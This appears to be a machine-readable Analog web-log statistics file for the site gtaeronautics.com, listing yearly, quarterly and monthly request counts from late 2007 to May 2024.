x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2024	05	29	02	08
x	FR	2007	12	18	17	05
x	LR	2024	05	28	04	55
x	E7	2024	05	29	02	08
x	SR	1933339
x	S7	7183
x	NC	654105
x	C7	0
x	FL	766570
x	F7	1534
x	RR	254
x	R7	0
x	NH	113099
x	H7	439
x	BT	57520368399
x	B7	0
1	Rr	329133	17.024	2024
1	Rr	511208	26.442	2023
1	Rr	82334	4.259	2022
1	Rr	98917	5.116	2021
1	Rr	89380	4.623	2020
1	Rr	80088	4.142	2019
1	Rr	68927	3.565	2018
1	Rr	60168	3.112	2017
1	Rr	73316	3.792	2016
1	Rr	80796	4.179	2015
1	Rr	110773	5.730	2014
1	Rr	65173	3.371	2013
1	Rr	60742	3.142	2012
1	Rr	57015	2.949	2011
1	Rr	22139	1.145	2010
1	Rr	69710	3.606	2009
1	Rr	71820	3.715	2008
1	Rr	1700	0.088	2007
1	*BT	R	511208	2023
Q	Rr	119701	6.191	2024	2
Q	Rr	209432	10.833	2024	1
Q	Rr	182268	9.428	2023	4
Q	Rr	165939	8.583	2023	3
Q	Rr	135306	6.999	2023	2
Q	Rr	27695	1.432	2023	1
Q	Rr	20307	1.050	2022	4
Q	Rr	20362	1.053	2022	3
Q	Rr	21795	1.127	2022	2
Q	Rr	19870	1.028	2022	1
Q	Rr	21154	1.094	2021	4
Q	Rr	26826	1.388	2021	3
Q	Rr	30675	1.587	2021	2
Q	Rr	20262	1.048	2021	1
Q	Rr	22199	1.148	2020	4
Q	Rr	23882	1.235	2020	3
Q	Rr	21656	1.120	2020	2
Q	Rr	21643	1.119	2020	1
Q	Rr	19098	0.988	2019	4
Q	Rr	19668	1.017	2019	3
Q	Rr	19827	1.026	2019	2
Q	Rr	21495	1.112	2019	1
Q	Rr	18129	0.938	2018	4
Q	Rr	17138	0.886	2018	3
Q	Rr	16928	0.876	2018	2
Q	Rr	16732	0.865	2018	1
Q	Rr	15937	0.824	2017	4
Q	Rr	0	0.000	2017	3
Q	Rr	16831	0.871	2017	2
Q	Rr	27400	1.417	2017	1
Q	Rr	22114	1.144	2016	4
Q	Rr	17621	0.911	2016	3
Q	Rr	15878	0.821	2016	2
Q	Rr	17703	0.916	2016	1
Q	Rr	16575	0.857	2015	4
Q	Rr	22104	1.143	2015	3
Q	Rr	22485	1.163	2015	2
Q	Rr	19632	1.015	2015	1
Q	Rr	21142	1.094	2014	4
Q	Rr	22272	1.152	2014	3
Q	Rr	31453	1.627	2014	2
Q	Rr	35906	1.857	2014	1
Q	Rr	16436	0.850	2013	4
Q	Rr	15216	0.787	2013	3
Q	Rr	16545	0.856	2013	2
Q	Rr	16976	0.878	2013	1
Q	Rr	16578	0.857	2012	4
Q	Rr	12511	0.647	2012	3
Q	Rr	15816	0.818	2012	2
Q	Rr	15837	0.819	2012	1
Q	Rr	15444	0.799	2011	4
Q	Rr	17386	0.899	2011	3
Q	Rr	9395	0.486	2011	2
Q	Rr	14790	0.765	2011	1
Q	Rr	1603	0.083	2010	4
Q	Rr	0	0.000	2010	3
Q	Rr	14047	0.727	2010	2
Q	Rr	6489	0.336	2010	1
Q	Rr	16350	0.846	2009	4
Q	Rr	18220	0.942	2009	3
Q	Rr	17115	0.885	2009	2
Q	Rr	18025	0.932	2009	1
Q	Rr	15905	0.823	2008	4
Q	Rr	15660	0.810	2008	3
Q	Rr	22448	1.161	2008	2
Q	Rr	17807	0.921	2008	1
Q	Rr	1700	0.088	2007	4
Q	*BT	R	209432	2024	1
m	Rr	56988	2.948	2024	05
m	Rr	62713	3.244	2024	04
m	Rr	66782	3.454	2024	03
m	Rr	68592	3.548	2024	02
m	Rr	74058	3.831	2024	01
m	Rr	54270	2.807	2023	12
m	Rr	61278	3.170	2023	11
m	Rr	66720	3.451	2023	10
m	Rr	51132	2.645	2023	09
m	Rr	54561	2.822	2023	08
m	Rr	60246	3.116	2023	07
m	Rr	66204	3.424	2023	06
m	Rr	60120	3.110	2023	05
m	Rr	8982	0.465	2023	04
m	Rr	10848	0.561	2023	03
m	Rr	8360	0.432	2023	02
m	Rr	8487	0.439	2023	01
m	Rr	6950	0.359	2022	12
m	Rr	6349	0.328	2022	11
m	Rr	7008	0.362	2022	10
m	Rr	6740	0.349	2022	09
m	Rr	6863	0.355	2022	08
m	Rr	6759	0.350	2022	07
m	Rr	6567	0.340	2022	06
m	Rr	8427	0.436	2022	05
m	Rr	6801	0.352	2022	04
m	Rr	6380	0.330	2022	03
m	Rr	6175	0.319	2022	02
m	Rr	7315	0.378	2022	01
m	Rr	7667	0.397	2021	12
m	Rr	7097	0.367	2021	11
m	Rr	6390	0.331	2021	10
m	Rr	6059	0.313	2021	09
m	Rr	9092	0.470	2021	08
m	Rr	11675	0.604	2021	07
m	Rr	10152	0.525	2021	06
m	Rr	10231	0.529	2021	05
m	Rr	10292	0.532	2021	04
m	Rr	7948	0.411	2021	03
m	Rr	5800	0.300	2021	02
m	Rr	6514	0.337	2021	01
m	Rr	8069	0.417	2020	12
m	Rr	6579	0.340	2020	11
m	Rr	7551	0.391	2020	10
m	Rr	8028	0.415	2020	09
m	Rr	7741	0.400	2020	08
m	Rr	8113	0.420	2020	07
m	Rr	7317	0.378	2020	06
m	Rr	6898	0.357	2020	05
m	Rr	7441	0.385	2020	04
m	Rr	7524	0.389	2020	03
m	Rr	7322	0.379	2020	02
m	Rr	6797	0.352	2020	01
m	Rr	6573	0.340	2019	12
m	Rr	5917	0.306	2019	11
m	Rr	6608	0.342	2019	10
m	Rr	6791	0.351	2019	09
m	Rr	6597	0.341	2019	08
